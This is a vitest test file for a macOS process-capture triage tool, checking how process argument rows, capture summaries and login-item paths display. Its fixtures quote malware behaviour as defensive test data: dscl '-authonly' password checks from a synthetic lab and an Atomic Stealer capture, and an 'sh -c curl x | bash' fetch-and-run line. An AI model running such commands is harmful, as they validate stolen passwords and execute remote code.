import { expect, test } from 'vitest';
import type { LoadedCapture } from '../src/ingest/load';
import type { Image, Process } from '../src/model/types';
import type { CaptureStats } from '../src/model/types';
import { itemPathKind } from '../src/model/util';
import { captureInfo, itemArgs, rowArgs } from '../src/ui/triage-model';
import { procByPid, queued } from './helpers';
import { realTest } from './real';

const img = (o: Partial<Image>): Image => ({
  token: '1:1', path: null, signingId: null, teamId: null, isPlatform: false, csFlags: 0,
  args: null, cwd: null, env: null, stdinIsPipe: null, script: null, time: null, seq: 0, inherited: false, ...o,
});
const proc = (images: Image[]): Process => ({
  id: '1:1', pid: 1, ghost: false, images, forkParent: null, originalPpid: null, ppid: null, parentToken: null,
  responsibleToken: null, originalParent: null, currentParent: null, responsible: null, startTime: null, exitTime: null,
  firstSeq: 1, fileOps: [],
});

test("the synthetic lab's dscl row shows dscl's own arguments", () => {
  const { m, a } = queued('synthetic-lab.jsonl');
  const p = procByPid(m, 7016);
  expect(p.images.map(i => i.path?.split('/').pop())).toEqual(['zsh', 'dscl']);   // the fork's inherited zsh, then dscl
  const q = a.queue.find(x => x.procId === p.id)!;
  expect(itemArgs({ model: m } as LoadedCapture, q)).toBe('. -authonly labuser labpass-not-real');
  expect(rowArgs(p)).toBe('. -authonly labuser labpass-not-real');
});

realTest("atomic's dscl row shows dscl's own arguments, not the sh -c wrapper's", () => {
  const { m, a } = queued('atomic_stealer.json');
  const p = [...m.processes.values()].find(x => x.images.some(i => i.args?.includes('-authonly')))!;
  expect(p.images.map(i => i.path?.split('/').pop())).toEqual(['Application.app', 'sh', 'bash', 'dscl']);
  const q = a.queue.find(x => x.procId === p.id)!;
  expect(itemArgs({ model: m } as LoadedCapture, q)).toBe('/Local/Default -authonly sandy sandybachs');
  expect(rowArgs(p)).toBe('/Local/Default -authonly sandy sandybachs');
});

test('the latest image has no args (exec not seen): earlier args are prefixed with that image\'s program', () => {
  const p = proc([
    img({ path: '/bin/sh', args: ['sh', '-c', 'curl x | bash'] }),
    img({ path: '/usr/bin/curl', args: null }),
  ]);
  expect(rowArgs(p)).toBe('sh -c curl x | bash');
});

test('a process that never exec\'d with args shows none; a single image shows its own args', () => {
  expect(rowArgs(proc([img({ path: '/bin/x', args: null, inherited: true })]))).toBe('');
  expect(rowArgs(proc([img({ path: '/bin/ls', args: ['ls', '-l', '/tmp'] })]))).toBe('-l /tmp');
  expect(rowArgs(procByPid(queued('synthetic-lab.jsonl').m, 7006))).toContain('display dialog');
});

const stats = (o: Partial<CaptureStats>): CaptureStats =>
  ({ lines: 0, events: 1, badLines: 0, otherEvents: {}, versions: [11], firstSeq: 1, firstTime: null, lastTime: null, ...o });

test('captureInfo lists unreadable lines, other event types and the schema version', () => {
  expect(captureInfo(stats({ badLines: 2, otherEvents: { xyz: 3 }, versions: [11] })))
    .toEqual({ line: '2 unreadable lines · other events: xyz ×3 · schema v11', older: false });
  expect(captureInfo(stats({ badLines: 1 })).line).toBe('1 unreadable line · schema v11');
  expect(captureInfo(stats({ otherEvents: { a: 1, b: 9, c: 1, d: 1, e: 1, f: 1, g: 1 } })).line)
    .toBe('other events: b ×9, a ×1, c ×1, d ×1, e ×1, 2 more · schema v11');
});

test('captureInfo flags captures older than schema 11, and says nothing when there is nothing to say', () => {
  expect(captureInfo(stats({ versions: [6] }))).toEqual({ line: 'schema v6', older: true });
  expect(captureInfo(stats({ versions: [6, 11] })).older).toBe(false);
  expect(captureInfo(stats({ versions: [] }))).toEqual({ line: null, older: false });
});

test('itemPathKind tells a plist from an app bundle (a login item\'s item URL is the app)', () => {
  expect(itemPathKind('/Users/u/Library/LaunchAgents/x.plist')).toBe('plist');
  expect(itemPathKind('/Library/LaunchDaemons/X.PLIST')).toBe('plist');
  expect(itemPathKind('/Applications/Evil.app/')).toBe('app');
  expect(itemPathKind('/Applications/Evil.app')).toBe('app');
  expect(itemPathKind('/Users/u/some/other/thing')).toBe('other');
  expect(itemPathKind(null)).toBeNull();
  expect(itemPathKind('')).toBeNull();
});
